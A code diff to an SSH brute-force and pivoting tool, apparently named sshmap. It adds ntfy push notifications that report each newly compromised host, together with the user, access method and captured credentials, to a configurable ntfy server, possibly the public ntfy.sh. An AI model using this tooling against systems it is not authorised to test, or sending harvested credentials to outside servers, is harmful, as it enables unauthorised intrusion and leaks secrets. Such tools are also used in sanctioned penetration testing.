@@ -1,6 +1,5 @@
 import argparse
 import asyncio
-import os
 import sys
 from modules import bruteforce, graphdb
 from modules.attempt_store import AttemptStore
@@ -33,6 +32,7 @@ from rich.progress import (
 )
 import random
 from modules.helpers.AsyncRandomQueue import AsyncRandomQueue
+from modules.notifier import notifier
 
 
 VERSION = "1.0.1"
@@ -54,6 +54,7 @@ currenttime = datetime.now().strftime("%Y%m%d_%H%M%S")
 
 console = nxc_console
 visited_attempts = set()
+hosts_compromised_count = 0
 
 
 progress = Progress(
@@ -156,6 +157,17 @@ async def handle_target(
                         sshmap_logger.success(
                             f"[{target}:{port}] Successfully added SSH connection from {source_host} to {remote_hostname} with user {res.user}"
                         )
+                        global hosts_compromised_count
+                        hosts_compromised_count += 1
+                        notifier.notify_new_access(
+                            source_host=source_host,
+                            remote_host=remote_hostname,
+                            user=res.user,
+                            method=res.method,
+                            creds=res.creds,
+                            ip=target,
+                            port=port,
+                        )
                         # keys_found = key_scanner.find_keys(ssh_conn)
                         # logger.info(f"[{target}] Keys found: {keys_found}")
                         # I need to create new jobs only if i have not used this jump before
@@ -168,6 +180,11 @@ async def handle_target(
                                 f"[depth:{current_depth}] New jumphost found: {remote_hostname}, starting recursive scan"
                             )
                             visited_attempts.add(remote_hostname)
+                            notifier.notify_new_jumphost(
+                                host=remote_hostname,
+                                depth=current_depth,
+                                source_host=source_host,
+                            )
                             
                             # In force_targets_mode, use the force_targets_ips instead of discovering from remote host
                             if force_targets_mode and force_targets_ips:
@@ -428,6 +445,11 @@ async def async_main(args):
     sshmap_logger.success("Closing all SSH sessions and connections.")
     await ssh_session_manager.close_all()
     sshmap_logger.success("All tasks completed.")
+    notifier.notify_scan_complete(
+        targets_count=len(new_targets),
+        hosts_found=hosts_compromised_count,
+        depth=max_depth,
+    )
 
 
 def print_jumphosts(visited_attempts):
@@ -546,9 +568,37 @@ def main():
         help="Start scanning from a specific remote hostname (must exist in graphdb)",
     )
 
+    ntfy_group = parser.add_argument_group(
+        "ntfy notifications",
+        "Send push notifications to an ntfy server (https://ntfy.sh or self-hosted).\n"
+        "Can also be configured via ~/.sshmap/config.yml (ntfy_url / ntfy_topic / ntfy_token)."
+    )
+    ntfy_group.add_argument(
+        "--ntfy-url",
+        default=None,
+        help="ntfy server URL, e.g. https://ntfy.sh or http://localhost:8080",
+    )
+    ntfy_group.add_argument(
+        "--ntfy-topic",
+        default=None,
+        help="ntfy topic to publish to (e.g. sshmap-alerts)",
+    )
+    ntfy_group.add_argument(
+        "--ntfy-token",
+        default=None,
+        help="Optional Bearer token for protected ntfy topics",
+    )
+
     args = parser.parse_args()
     global max_depth
     max_depth = args.maxdepth
+
+    # Configure ntfy notifier: CLI args take priority over config.yml
+    _ntfy_url   = args.ntfy_url   or CONFIG.get("ntfy_url", "")
+    _ntfy_topic = args.ntfy_topic or CONFIG.get("ntfy_topic", "")
+    _ntfy_token = args.ntfy_token or CONFIG.get("ntfy_token", "")
+    if _ntfy_url and _ntfy_topic:
+        notifier.configure(url=_ntfy_url, topic=_ntfy_topic, token=_ntfy_token)
 
     if args.log:
         # Set up logging to a file
